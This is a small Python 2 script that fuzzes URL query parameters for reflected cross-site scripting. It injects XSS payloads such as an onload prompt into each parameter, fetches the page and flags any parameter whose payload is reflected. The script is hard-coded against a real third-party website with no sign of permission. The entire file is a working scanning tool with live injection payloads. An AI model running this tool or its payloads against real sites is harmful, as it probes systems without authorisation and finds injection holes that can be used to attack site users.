#coding=utf-8
import urlparse
import urllib2
import urllib

import re

class fuzzer:
    
    def __init__(self,url,keyword=""):
        self.url = url
        self.keyword = keyword
    def detect(self):

        result = urlparse.urlparse(self.url)
        params = urlparse.parse_qs(result.query,True)
        for key in params:    
            if self.keyword != "":
                if self.keyword == key:
                    #params[key] = params[key]+"'><Svg/onload=alert(628)><'"
                    return_value = self.fuzz(params[key][0])
                    if return_value != None  and return_value != "Error":
                        print "[!]Vuln url:"+self.url+"\n"
                        print "[!]Vuln para:"+keyword+"\n"
                    return
                else:
                    return
            else:
                return_value = self.fuzz(params[key][0])
                if return_value != None and return_value != "Error":  
                    log_value = "[!]Vuln url:"+self.url+"\n[!]Vuln para:"+key+"\n"
                    return log_value
                else:
                    pass
        return "Error"
                
    
    def fuzz(self,value=""):
        fuzz_list = [r"'><Svg/onload=prompt(628)><'",r"'><sCript defer>prompt(628)</SCript><'"]
        #fuzz_list = ['628']
        #if value != "":
        for item in fuzz_list:
            vector_value = str(value) + str(item)
            #print vector_value
            #print value
            detect_url = self.url.replace(value,vector_value)
            try:
                resp = urllib2.urlopen(detect_url).read()
                #match = re.search(r"\n.*628.*\n",resp)
                match = re.search(r"prompt\(628",''.join(resp))
                if match:
                    print "[!]Match success!\n"
                    return "Success"
                else:
                    pass
            except Exception,e:
                print "[!]Match error:"+str(e)+"\n"
                return "Error"
        return

            
if __name__ == "__main__":
    url = "http://www.tvsou.com/column/index.asp?id=yuQ17S"
    keyword = "id"
    #fuzzer = fuzzer(url,keyword)
    fuzzer = fuzzer(url)
    fuzzer.detect()
            
                
            
        
        
    